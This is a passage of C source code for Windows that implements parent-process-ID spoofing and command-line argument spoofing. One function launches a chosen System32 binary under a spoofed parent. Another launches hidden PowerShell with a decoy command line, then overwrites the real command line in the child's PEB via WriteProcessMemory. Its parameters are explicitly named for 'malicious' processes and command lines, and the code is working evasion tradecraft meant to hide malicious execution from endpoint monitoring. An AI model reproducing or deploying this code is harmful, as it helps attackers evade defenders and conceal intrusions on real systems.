	if (!*pdwProcessId || !*phProcessHandle || !*pdwThreadId || !*phThreadHandle) return FALSE;
	bState = TRUE;


EndOfFunc:
	if (pProcEnvBlock_t) HeapFree(hHeap, 0, pProcEnvBlock_t);
	if (pProcessUserParameters)HeapFree(hHeap, 0, pProcessUserParameters);

	return bState;
}


BOOLEAN SpoofParentProcessId
(
	IN     LPSTR   pMaliciousProcessName, 
	IN     HANDLE  hSpoofedParentProcessHandle, //a HANDLE is a datatype used by the WinAPI to handle i.e. Interact with objects (files, processes, threads, consoles, windows, etc..)
	   OUT PDWORD  pdwMaliciousProcessPID,
	   OUT PHANDLE phMaliciousProcessHandle,
	   OUT PDWORD  pdwMaliciousThreadId,
	   OUT PHANDLE phMaliciousThreadHandle
)
{
	if (!pMaliciousProcessName	  || !hSpoofedParentProcessHandle || !pdwMaliciousProcessPID 
	 || !phMaliciousProcessHandle || !pdwMaliciousThreadId		  || !phMaliciousThreadHandle) return FALSE;

	SIZE_T						sThreadAttributeListSize = 0;
	PPROC_THREAD_ATTRIBUTE_LIST pThreadsAttributeList_t  = NULL;
	STARTUPINFOEXA				StartupInfoEx_t			 = { .StartupInfo.cb = sizeof(STARTUPINFOEXA) };
	HANDLE						hHeap					 = GetProcessHeap();
	PROCESS_INFORMATION         ProcessInformation_t	 = { 0 };
	BOOLEAN						bState					 = FALSE;
	CHAR
		lpPath[MAX_PATH] = { '\0' },
		WnDr[MAX_PATH]   = { '\0' };

	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttributeListSize);

	if (!(pThreadsAttributeList_t = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sThreadAttributeListSize))) return FALSE;

	if (!GetEnvironmentVariableA("WinDir", WnDr, MAX_PATH)) goto EndOfFunc;

	if (sprintf_s(lpPath, MAX_PATH,"%s\\System32\\%s", WnDr, pMaliciousProcessName) == 1) goto EndOfFunc;

	if (!InitializeProcThreadAttributeList(pThreadsAttributeList_t, 1, NULL, &sThreadAttributeListSize)) return FALSE;

	if (!UpdateProcThreadAttribute(pThreadsAttributeList_t, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hSpoofedParentProcessHandle, sizeof(HANDLE), NULL, NULL)) goto EndOfFunc;

	StartupInfoEx_t.lpAttributeList = pThreadsAttributeList_t;

	if (!CreateProcessA(
		lpPath, NULL,
		NULL, NULL,
		FALSE, CREATE_SUSPENDED |  EXTENDED_STARTUPINFO_PRESENT,
		NULL, "C:\\Windows\\System32",
		&StartupInfoEx_t.StartupInfo, &ProcessInformation_t)) goto EndOfFunc;

	if (!ProcessInformation_t.dwProcessId || !ProcessInformation_t.hProcess || !ProcessInformation_t.dwThreadId || !ProcessInformation_t.hThread) goto EndOfFunc; 

	*pdwMaliciousProcessPID   = ProcessInformation_t.dwProcessId;
	*phMaliciousProcessHandle = ProcessInformation_t.hProcess;
	*pdwMaliciousThreadId     = ProcessInformation_t.dwThreadId;
	*phMaliciousThreadHandle  = ProcessInformation_t.hThread;
	bState = TRUE;

EndOfFunc:
	HeapFree(hHeap, 0, pThreadsAttributeList_t);

	return bState;
}

BOOLEAN SpoofProcessCLA_PPID //CLA = Command Line Argument | PPID = Parent Process Identifier
(
	IN	    LPWSTR  pSpoofedCommandLine,
	IN      HANDLE  hSpoofedParentProcessHandle,
	IN      LPWSTR  pMaliciousCommandLine,
	IN      DWORD   dwExposedCommandLineLength,
	IN      PCH     pTargetSpoofedPathName,
	   OUT 	PHANDLE phMaliciousProcessHandle,
	   OUT  PDWORD  pdwMaliciousProcessId,
	   OUT	PHANDLE phMalicousThreadHandle,
	   OUT  PDWORD  pdwMaliciousThreadId 
)
{
	if (!pSpoofedCommandLine	  || !hSpoofedParentProcessHandle || !pMaliciousCommandLine  || !dwExposedCommandLineLength ||
		!phMaliciousProcessHandle || !pdwMaliciousProcessId       || !phMalicousThreadHandle || !pdwMaliciousThreadId		  ) return FALSE;

	WCHAR
		pSpoofedProcessPath[MAX_PATH]  = { 0x0 },
		pProcess[MAX_PATH]			   = { 0x0 },
		pSpoofedSubDirectory[MAX_PATH] = { 0x0 };

	DWORD						 dwNewLen = sizeof(L"powershell.exe");
	HANDLE						 hHeap					  = GetProcessHeap();
	BOOLEAN						 bState					  = FALSE;
	ULONG						 ulRetren				  = 0;
	SIZE_T						 sThreadAttributeListSize = 0,
								 sConvertedBytes		  = 0;
	NTSTATUS					 ntStatus				  = 0;
	STARTUPINFOEXW				 StartupInfoEx_t		  = { .StartupInfo.cb = sizeof(STARTUPINFOEXW) };
	PROCESS_INFORMATION          ProcessInformation_t	  = { 0 };
	PROCESS_BASIC_INFORMATION	 ProcessBasicInfoBlock_t  = { 0 };
	PPEB						 pProcEnvBlock_t		  = NULL;
	PPROC_THREAD_ATTRIBUTE_LIST  pThreadsAttributeList_t  = NULL;
	fnNTQueryProcessInformation  NtQueryProcInfo          = NULL;
	PRTL_USER_PROCESS_PARAMETERS pProcessUserParameters   = NULL;


	if (!(NtQueryProcInfo = (fnNTQueryProcessInformation)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess"))) return FALSE;

	InitializeProcThreadAttributeList(NULL, 1, 0, &sThreadAttributeListSize);
	
	if (!(pThreadsAttributeList_t = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(hHeap, 0, sThreadAttributeListSize))) return FALSE;

	if (!InitializeProcThreadAttributeList(pThreadsAttributeList_t, 1, 0, &sThreadAttributeListSize)) goto EndOfFunc;

	if (!GetEnvironmentVariableW(L"windir", pSpoofedProcessPath, MAX_PATH * sizeof(WCHAR))) goto EndOfFunc;

	if (!UpdateProcThreadAttribute(pThreadsAttributeList_t, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hSpoofedParentProcessHandle, sizeof(HANDLE), NULL, NULL)) goto EndOfFunc;

	StartupInfoEx_t.lpAttributeList = pThreadsAttributeList_t;

	pSpoofedProcessPath[lstrlenW(pSpoofedProcessPath)] = 0x5C; // L'\\'

	if (mbstowcs_s(&sConvertedBytes, pSpoofedSubDirectory, MAX_PATH, pTargetSpoofedPathName, MAX_PATH) || sConvertedBytes != 1 + strlen(pTargetSpoofedPathName)) goto EndOfFunc;

	pSpoofedSubDirectory[0] = towupper(pSpoofedSubDirectory[0]);

	wcscat_s(pSpoofedProcessPath, MAX_PATH, pSpoofedSubDirectory);

	SIZE_T Index = lstrlenW(pSpoofedProcessPath);
	
	pSpoofedProcessPath[Index] = 0x5C; // L'\\'

	pSpoofedProcessPath[Index + 1] = 0x0;

	if (!CreateProcessW(
		L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", pSpoofedCommandLine,
		NULL, NULL,
		FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
		NULL, pSpoofedProcessPath,
		&StartupInfoEx_t.StartupInfo, &ProcessInformation_t)) 
	{
		printf("CreateProcessW Failed With Error: 0x%lx", GetLastError());
		goto EndOfFunc;
	}

	if ((ntStatus = NtQueryProcInfo(
		ProcessInformation_t.hProcess,
		ProcessBasicInformation,
		&ProcessBasicInfoBlock_t,sizeof(PROCESS_BASIC_INFORMATION)
		,&ulRetren)) != 0) return FALSE;

	pProcEnvBlock_t = (PPEB)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PEB));

	if (!ReadStructureFromProcess(
		ProcessInformation_t.hProcess, ProcessBasicInfoBlock_t.PebBaseAddress,
		(PVOID*)&pProcEnvBlock_t,sizeof(PEB),
		hHeap
	)) goto EndOfFunc;

	if (!ReadStructureFromProcess(
		ProcessInformation_t.hProcess,pProcEnvBlock_t->ProcessParameters, 
		(PVOID *)&pProcessUserParameters,sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF,
		hHeap
	)) goto EndOfFunc;

	if (!WriteToTargetProcessEnvironmentBlock(
		ProcessInformation_t.hProcess, (PVOID)pProcessUserParameters->CommandLine.Buffer,
		(PVOID)pMaliciousCommandLine, (DWORD)(lstrlenW(pMaliciousCommandLine) * sizeof(WCHAR) + 1)
	)) goto EndOfFunc;

	if (!WriteToTargetProcessEnvironmentBlock(
		ProcessInformation_t.hProcess,
		((PBYTE)pProcEnvBlock_t->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)),
		(PVOID)&dwNewLen,
		sizeof(DWORD))) goto EndOfFunc;

	if (!ProcessInformation_t.dwProcessId || !ProcessInformation_t.dwThreadId|| !ProcessInformation_t.hProcess|| !ProcessInformation_t.hThread) goto EndOfFunc;

	*phMalicousThreadHandle   = ProcessInformation_t.hThread;
	*pdwMaliciousThreadId     = ProcessInformation_t.dwThreadId;
	*phMaliciousProcessHandle = ProcessInformation_t.hProcess;
	*pdwMaliciousProcessId    = ProcessInformation_t.dwProcessId;

	bState = TRUE;

EndOfFunc:

	if (pThreadsAttributeList_t) DeleteProcThreadAttributeList(pThreadsAttributeList_t);

	if (pProcEnvBlock_t) HeapFree(hHeap, 0, pProcEnvBlock_t);

	if (pProcessUserParameters) HeapFree(hHeap, 0, pProcessUserParameters);

	return bState;
}

BOOLEAN ReadStructureFromProcess
(
	IN     HANDLE hTargetProcess, 
	IN     PVOID  pPEBBaseAddress, 
	   OUT PVOID *pReadBufferAddress, 
	IN     DWORD  dwBufferSize,
	IN     HANDLE hHeap
)
{
	if (!hTargetProcess || !pPEBBaseAddress ||  !dwBufferSize || !pReadBufferAddress) return FALSE;

	if (*pReadBufferAddress)
	{
		*pReadBufferAddress = NULL;
	}

	SIZE_T	sBytesRead = 0;

	*pReadBufferAddress = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwBufferSize);

	if (!ReadProcessMemory(hTargetProcess, pPEBBaseAddress, *pReadBufferAddress, dwBufferSize, &sBytesRead) || sBytesRead != dwBufferSize) return FALSE;

	return TRUE;
}

BOOLEAN WriteToTargetProcessEnvironmentBlock
(
	IN      HANDLE hProcess,
	IN      PVOID  pAddressToWriteTo,
	IN      PVOID  pBuffer,
	IN      DWORD  dwBufferSize
)
{
	if (!hProcess || !pAddressToWriteTo || !pBuffer || !dwBufferSize) return FALSE;

	SIZE_T sBytesWritten = 0;

	if (!WriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &sBytesWritten) || sBytesWritten != dwBufferSize) return FALSE;

	return TRUE;
}